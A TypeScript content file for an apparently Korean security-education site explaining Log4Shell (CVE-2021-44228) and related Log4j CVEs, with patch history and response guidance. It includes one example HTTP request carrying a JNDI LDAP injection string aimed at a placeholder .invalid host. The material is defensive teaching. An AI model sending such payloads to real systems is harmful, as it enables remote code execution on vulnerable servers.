import type { ContentItem } from "../content-types";

export const log4shellContent: ContentItem = {
  slug: "log4shell",
  category: "attack",
  title: "Log4Shell — Log4j의 JNDI 인젝션",
  subtitle: "로그에 남긴 외부 입력이 어떻게 원격 코드 실행으로 이어지는가",
  tags: ["Log4j", "Log4Shell", "JNDI", "RCE", "CVE-2021-44228", "Java"],
  description: `## 사건의 시점과 영향 범위
Log4j는 Apache 소프트웨어 재단의 Java 로깅 라이브러리입니다. **Log4Shell**은 일반적으로 **CVE-2021-44228**을 가리킵니다. Alibaba Cloud 보안팀은 **2021년 11월 24일 Apache에 제보**했고, **12월 9일 보안 공지**를 공개했습니다. 따라서 11월의 제보와 12월의 공개를 구분해야 합니다. [발견팀의 타임라인](https://www.alibabacloud.com/help/en/edas/product-overview/rce-vulnerability-in-apache-log4j)

널리 쓰이는 라이브러리의 간접 의존성까지 영향을 받았지만, 모든 인터넷 서비스가 취약했던 것은 아닙니다. 취약한 **log4j-core**, 외부 입력이 도달하는 로그 경로, Lookup 동작과 실행 환경을 함께 확인해야 합니다. **log4j-api만 사용하는 경우**는 이 JNDI 취약점의 대상과 구별합니다. [Apache 보안 공지](https://logging.apache.org/security.html)

## 공격 원리: 데이터가 조회 지시로 바뀌는 순간
- **입력 제어:** 공격자가 HTTP 헤더, 검색어, 사용자명처럼 로그에 남을 수 있는 값을 조작합니다. 인증 전에 기록되는 입력도 공격 표면이 될 수 있습니다.
- **로그 도달:** Java 애플리케이션이 그 값을 취약한 Log4j Core에 넘깁니다. 요청을 받는 것만으로 성립하지 않고, 해당 입력이 취약한 평가 경로에 도달해야 합니다.
- **Lookup 평가:** 메시지의 특수 표현식을 문자열 치환 기능이 해석합니다. JNDI는 Java Naming and Directory Interface이며, 이름으로 외부 자원을 찾는 인터페이스입니다.
- **외부 조회:** JNDI가 공격자 통제 LDAP 같은 엔드포인트로 서버 측 연결을 시도합니다. 이 연결은 서버에서 외부로 나가는 통신입니다.
- **객체 처리와 실행:** 응답의 객체·참조를 처리하는 과정에서 JDK 제한, 클래스패스와 객체 팩토리 등의 조건이 맞으면 애플리케이션 프로세스 권한으로 코드가 실행될 수 있습니다. 원격 클래스 로딩은 대표적인 경로이며, 모든 환경에서 같은 방식으로 동작하지는 않습니다.

핵심은 **로그 데이터와 외부 자원 조회 사이의 신뢰 경계가 무너진 것**입니다. 외부 조회 흔적은 중요한 신호이지만, 조회 성공만으로 코드 실행까지 입증되지는 않습니다. [Apache 최초 발표](https://www.openwall.com/lists/oss-security/2021/12/10/1), [JNDI 동작 분석](https://www.openwall.com/lists/oss-security/2021/12/10/2)

## 입력 예시와 성립 조건
다음은 구조를 읽기 위한 예시입니다. \`.invalid\`는 예시용 도메인이며, 이 페이지의 시각화는 실제 요청이나 JNDI 조회를 수행하지 않습니다.

~~~http
GET /search?q=demo HTTP/1.1
Host: service.example.invalid
User-Agent: \${jndi:ldap://lookup.example.invalid/demo}
~~~

애플리케이션이 User-Agent를 기록하고 취약한 Lookup 경로가 이를 평가하면 JNDI 조회로 이어질 수 있습니다. **헤더 이름 자체가 취약점은 아니며**, 다른 로그 입력도 같은 평가 경로를 만나면 문제가 됩니다. 파라미터화된 로깅을 사용한다는 사실만으로 당시의 메시지 Lookup 취약점이 해결되지는 않습니다.

## 다섯 CVE는 어떤 점이 다른가?
다음 취약점은 같은 시기에 논의되었지만 하나의 연속 공격 단계가 아닙니다. 시각화의 취약 경로는 **CVE-2021-44228**을 중심으로 설명합니다.

| CVE | 대상과 공격자가 제어해야 할 것 | 원인과 영향 |
| --- | --- | --- |
| CVE-2021-44228 | Log4j 2 Core · 로그 메시지나 파라미터 | JNDI Lookup 인젝션 → 외부 조회 → 조건부 RCE |
| CVE-2021-45046 | Log4j 2 Core · 특정 비기본 Pattern Layout + MDC 입력 제어 | 2.15.0 수정의 불완전한 경로 · 정보 유출과 환경에 따른 코드 실행 |
| CVE-2021-45105 | Log4j 2 Core · Context Lookup이 해석하는 MDC 입력 | 자기 참조 Lookup의 무제한 재귀 → StackOverflowError 등 서비스 거부(DoS) |
| CVE-2021-4104 | **Log4j 1.2** · 비기본 JMSAppender + 로깅 설정 쓰기 권한 | JNDI 요청과 신뢰할 수 없는 데이터 역직렬화 → RCE 가능 |
| CVE-2021-44832 | Log4j 2 Core · 로깅 설정 수정 권한 + JDBC Appender | JNDI 데이터 소스 설정 악용 → RCE 가능 |

**MDC(Thread Context Map)** 는 요청별 문맥 값을 로그에 연결하는 저장소입니다. 45046과 45105는 이 값이 특정 레이아웃에서 다시 평가되는 조건을 확인해야 합니다. 45105는 외부 LDAP 연결 없이도 문제가 되는 재귀 평가이며, 4104와 44832는 설정 변경 권한이 전제입니다. 이들을 모두 “HTTP 헤더 하나로 발생하는 RCE”로 묶으면 조건을 잘못 이해하게 됩니다.

[45046 · Apache 공지](https://logging.apache.org/security.html), [45105 · Apache 발표](https://www.openwall.com/lists/oss-security/2021/12/19/1), [4104 · Apache 발표](https://www.openwall.com/lists/oss-security/2021/12/13/1), [44832 · Apache 발표](https://www.openwall.com/lists/oss-security/2021/12/28/1)

## 당시의 수정 이력과 현재의 업데이트 판단
아래는 **2021년 Java 8 이상 계열의 수정 이력**입니다. 현재 배포할 버전을 추천하는 표가 아닙니다. 구형 Java용 별도 수정 계열과 배포판 백포트는 해당 공급자 공지에서 확인합니다.

| 당시 릴리스 | 대응한 문제 | 다음 확인 사항 |
| --- | --- | --- |
| 2.15.0 | 44228 초기 대응 | 특정 구성의 45046이 남음 |
| 2.16.0 | 45046 대응 · 메시지 Lookup 제거 | 45105의 재귀 DoS가 남음 |
| 2.17.0 | 45105 대응 | 44832의 JDBC 설정 경로 확인 필요 |
| 2.17.1 | 당시 발표 기준 44832 대응 | 이후 보안 공지까지 확인 필요 |

44832의 당시 Apache 발표에는 Java 7용 **2.12.4**, Java 6용 **2.3.2**도 기재되어 있습니다. Log4j 1.x는 2015년에 지원이 종료되었으므로 지원되는 로깅 구현으로 이전해야 합니다. [44832 수정 발표](https://www.openwall.com/lists/oss-security/2021/12/28/1), [Log4j 1.x 지원 종료와 구분](https://blogsarchive.apache.org/foundation/entry/apache-log4j-cves)

## 대응과 검증
- **실제 자산 확인:** 직접·간접 의존성, 중첩 JAR, 컨테이너 이미지와 공급업체 제품에서 실행 중인 로깅 구현을 식별합니다.
- **업데이트와 재배포:** 현재 Apache 및 제품 공급자 공지에 맞는 지원 버전·패치로 교체하고 프로세스를 재시작합니다. 저장소의 의존성 파일뿐 아니라 배포된 산출물도 확인합니다.
- **설정과 통신 통제:** 로깅 설정 쓰기 권한을 제한하고 불필요한 JNDI 사용 및 외부 통신을 줄입니다. WAF, 외부 연결 제한, JDK 제한은 보조 수단이며 라이브러리 수정을 대체하지 않습니다. 특히 formatMsgNoLookups 설정만으로 다섯 CVE 전체를 해결할 수는 없습니다.
- **침해 여부 조사:** 의심스러운 로그 문자열, 외부 DNS·LDAP 통신, Java 프로세스의 비정상 자식 프로세스와 파일 변경을 연관 분석합니다. 로그에 문자열이 보인다는 사실과 실제 코드 실행을 구별하고, 침해 정황이 있으면 패치와 함께 사고 대응을 진행합니다.

시각화의 ‘패치된 로그 경로’는 **메시지 Lookup 제거로 44228 경로가 끊기는 모습**을 나타냅니다. DoS, 설정 권한 및 다른 CVE의 해결 여부는 별도로 검증해야 합니다.`,
  learningObjectives: ["외부 로그 입력이 취약한 조회 기능에 도달하는 신뢰 경계를 설명할 수 있다."],
  commonMistakes: ["취약한 Log4j Core의 Lookup 평가 경로가 존재해야 하며, 모든 Java 서비스가 같은 조건으로 취약한 것은 아닙니다."],
  keyTakeaways: ["영향받는 의존성과 설정, 실제 로그 경로 및 패치 적용 상태를 함께 확인합니다."],
  exercises: [{"question":"Log4Shell 노출 여부를 판단할 때 먼저 확인할 항목은?","options":["취약한 log4j-core 버전·설정·입력 경로","웹사이트의 배경색","TLS 인증서 글꼴"],"answerIndex":0,"explanation":"취약한 라이브러리와 입력 처리 조건이 결합되는지 평가해야 합니다."}],
  steps: [
    "외부 입력 — 공격자가 로그에 기록될 헤더나 입력값에 JNDI 표현식을 넣습니다.",
    "로그 기록 — Java 서비스가 외부 입력을 취약한 Log4j Core에 전달합니다.",
    "Lookup 평가 — 메시지 치환이 입력을 JNDI 자원 조회로 해석합니다.",
    "서버 측 연결 — JNDI가 공격자 통제 LDAP 엔드포인트를 조회합니다.",
    "응답 처리 — 외부 객체·참조를 받으며 JDK와 클래스패스 등 실행 조건이 관여합니다.",
    "조건부 영향 — 객체 처리 경로가 악용되면 Java 프로세스 권한으로 코드가 실행될 수 있습니다.",
  ],
  examples: [
    "로그 입력 추적 — User-Agent, 검색어, 사용자명이 어느 로깅 구현에 도달하는지 확인",
    "CVE 구분 — 메시지 인젝션, MDC 재평가, 재귀 DoS, 설정 변경 기반 공격의 조건 비교",
    "패치 검증 — 배포된 JAR와 컨테이너 이미지의 실제 버전·공급자 수정 이력 확인",
    "관측 해석 — 탐색 문자열, 외부 조회 성공, 실제 코드 실행의 증거를 구별",
  ],
  related: [
    { slug: "php2shell", category: "attack", relation: "런타임 취약점에 의한 RCE와 비교" },
    { slug: "api-gateway", category: "workflow", relation: "외부 요청의 진입 경계" },
  ],
};
